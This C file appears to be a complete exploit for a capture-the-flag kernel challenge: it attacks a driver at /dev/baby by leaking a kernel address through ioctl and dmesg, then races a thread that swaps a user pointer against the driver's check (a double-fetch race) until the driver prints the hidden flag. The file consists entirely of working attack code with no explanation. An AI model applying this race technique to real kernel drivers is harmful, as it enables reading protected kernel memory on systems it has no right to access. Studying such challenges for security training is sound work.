#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

typedef struct flag_info {
	char* flag_ptr;
	int flag_len;
}flag_info;

flag_info flag;
size_t flag_addr = 0;
int success = 0;
int try = 1000;
pthread_t comp_thread;

void* comp_func()
{
	while (!success)
	{
		int i = 0;
		for (i = 0; i < try; i++)
			flag.flag_ptr = (char*)flag_addr;
	}
	return 0;
}

int main(int argc, char** argv, char** env)
{
	int fd = open("/dev/baby", 2);
	char flag_ptr[] = "flag{123456}";
	int flag_len = 33;
	flag.flag_ptr = flag_ptr; 
	flag.flag_len = flag_len;
	ioctl(fd, 0x6666, &flag);
	system("dmesg | grep flag > flag_addr.txt");
	int i = 0;
	char buf[100] = { 0 };
	int flag_fd = open("flag_addr.txt", 2);
	read(flag_fd, buf, 100);
	close(flag_fd);
	system("rm flag_addr.txt -rf");
	for (i = 0; i < strlen(buf); i++)
	{
		if (buf[i] == 'a' && buf[i+1] == 't')
		{
			flag_addr = strtoull(&buf[i+2], NULL, 16);
			printf("\033[32m[+] flag addr is %#lx\n\033[0m\n", flag_addr);
			break;
		}
	}	
	char fflag[300] = { 0 };	
	pthread_create(&comp_thread, NULL, comp_func, NULL);
	while (!success)
	{
		int i = 0;
		for (i = 0; i < try; i++)
		{
			flag.flag_ptr = flag_ptr;
			ioctl(fd, 0x1337, &flag);
		}
		system("dmesg | grep flag{ | tail -n1 > real_flag.txt");
		int fl = open("real_flag.txt", 2);
		read(fl, fflag, 300);
		close(fl);
		if (strstr(fflag, "flag{"))
			success = 1;
	}
	pthread_cancel(comp_thread);
	system("rm real_flag.txt -rf");
	puts(fflag);
	return 0;
}
